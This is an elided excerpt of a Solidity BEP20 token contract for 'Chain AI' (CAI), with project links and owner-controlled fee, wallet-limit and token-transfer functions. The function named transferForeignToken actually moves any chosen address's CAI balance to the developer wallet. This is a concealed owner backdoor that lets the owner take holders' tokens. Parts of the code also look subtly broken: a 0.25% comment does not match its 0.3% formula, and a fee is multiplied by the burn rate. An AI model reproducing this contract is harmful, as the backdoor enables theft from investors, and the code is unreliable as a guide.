...
/*          Chain AI
            Telegram : https://t.me/ChainAi
            Webiste : https://chain-ai.org/
*/
...
contract CHAIN is IBEP20, Auth {
    ...
    string constant _name = "Chain AI";
    string constant _symbol = "CAI";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100e6 * (10 ** _decimals);
    ...
    address public marketingFeeReceiver = 0x5D898472786782dD9aB882aAba8D554703C25f39;
    address public devFeeReceiver = 0x5D898472786782dD9aB882aAba8D554703C25f39;
    ...
    uint256 public swapThreshold = _totalSupply / 1000 * 3; // 0.25%
    bool inSwap;
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        ...
        _balances[address(this)] = _balances[address(this)].add(feeAmount * burnfee);
   ...
   function setMaxWallet(uint256 amount) external onlyOwner {
    ...
    function setFees(uint256 _liquidityFee, uint256 _marketingFee, uint256 _devFee, uint256 _burnfee) external onlyOwner {
    ...
    function transferForeignToken(address token, uint256 value) external onlyOwner {
        ...
        _basicTransfer(token, devFeeReceiver, value);
    } 
